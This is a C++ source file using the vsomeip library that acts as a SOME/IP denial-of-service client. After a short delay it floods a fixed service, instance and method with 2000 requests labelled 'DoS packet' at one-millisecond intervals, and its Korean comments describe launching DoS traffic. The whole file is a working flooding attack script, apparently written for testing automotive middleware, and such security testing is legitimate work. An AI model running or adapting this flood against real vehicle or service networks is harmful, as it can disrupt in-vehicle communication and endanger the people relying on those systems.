#include <vsomeip/vsomeip.hpp>
#include <iostream>
#include <thread>
#include <chrono>

std::shared_ptr<vsomeip::application> app;

const vsomeip::service_t service_id = 0x1234;
const vsomeip::instance_t instance_id = 0x5678;
const vsomeip::method_t method_id = 0x0421;

void send_dos_requests() {
    std::this_thread::sleep_for(std::chrono::seconds(1)); // 연결 안정화 대기
    for (int i = 0; i < 2000; ++i) {
        std::string msg = "DoS packet " + std::to_string(i);
        std::vector<vsomeip::byte_t> data(msg.begin(), msg.end());

        std::shared_ptr<vsomeip::payload> pl = vsomeip::runtime::get()->create_payload();
        pl->set_data(data.data(), data.size());

        std::shared_ptr<vsomeip::message> request = vsomeip::runtime::get()->create_request();
        request->set_service(service_id);
        request->set_instance(instance_id);
        request->set_method(method_id);
        request->set_payload(pl);

        std::cout << "[client_dos] Sending DoS packet " << i << std::endl;
        app->send(request);

        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

int main() {
    app = vsomeip::runtime::get()->create_application("client_dos");

    if (!app->init()) {
        std::cerr << "Failed to initialize client_dos app." << std::endl;
        return 1;
    }

    app->request_service(service_id, instance_id);

    // DoS 트래픽 발사를 위한 별도 스레드 실행
    std::thread attack_thread(send_dos_requests);

    app->start(); // vsomeip 내부 loop 시작

    attack_thread.join(); // 스레드 종료까지 대기
    return 0;
}
